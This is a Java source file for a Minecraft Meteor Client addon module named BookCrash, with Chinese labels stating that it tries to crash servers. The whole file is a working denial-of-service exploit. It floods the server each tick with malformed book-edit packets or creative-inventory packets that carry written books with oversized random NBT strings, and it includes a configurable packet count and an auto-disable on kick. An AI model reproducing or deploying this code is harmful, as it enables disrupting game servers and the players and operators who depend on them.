package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import org.apache.commons.lang3.RandomStringUtils;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.ArrayList;
import java.util.Optional;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("模式")
        .description("发送哪种类型的数据包")
        .defaultValue(Mode.BookUpdate)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("发包数量")
        .description("每刻度向服务器发送多少个数据包")
        .defaultValue(100)
        .min(1)
        .sliderMax(1000)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("踢出关闭")
        .description("在被踢出时禁用模块")
        .defaultValue(true)
        .build());

    public BookCrash() {
        super(CrashAddon.CATEGORY, "book崩溃", "尝试通过发送错误的书签数据包来使服务器崩溃");
    }
    int slot = 5;

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (Utils.canUpdate()) {
            for (int i = 0; i < amount.get(); i++) sendBadBook();
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = RandomStringUtils.randomAlphanumeric(255);

        switch (mode.get()) {
            case BookUpdate -> {
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    StringBuilder page = new StringBuilder();
                    page.append(mm255);
                    pages.add(page.toString());
                }

                mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
            }
            case Creative -> {
                for (int i = 0; i < 5; i++) {
                    if (slot > 36 + 9) {
                        slot = 0;
                        return;
                    }
                    slot++;
                    ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
                    NbtCompound tag = new NbtCompound();
                    NbtList list = new NbtList();
                    for (int j = 0; j < 99; j++) {
                        list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
                    }
                    tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
                    tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
                    tag.put("pages", list);
                    book.setNbt(tag);
                    mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, book));
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Mode {
        BookUpdate,
        Creative
    }
}
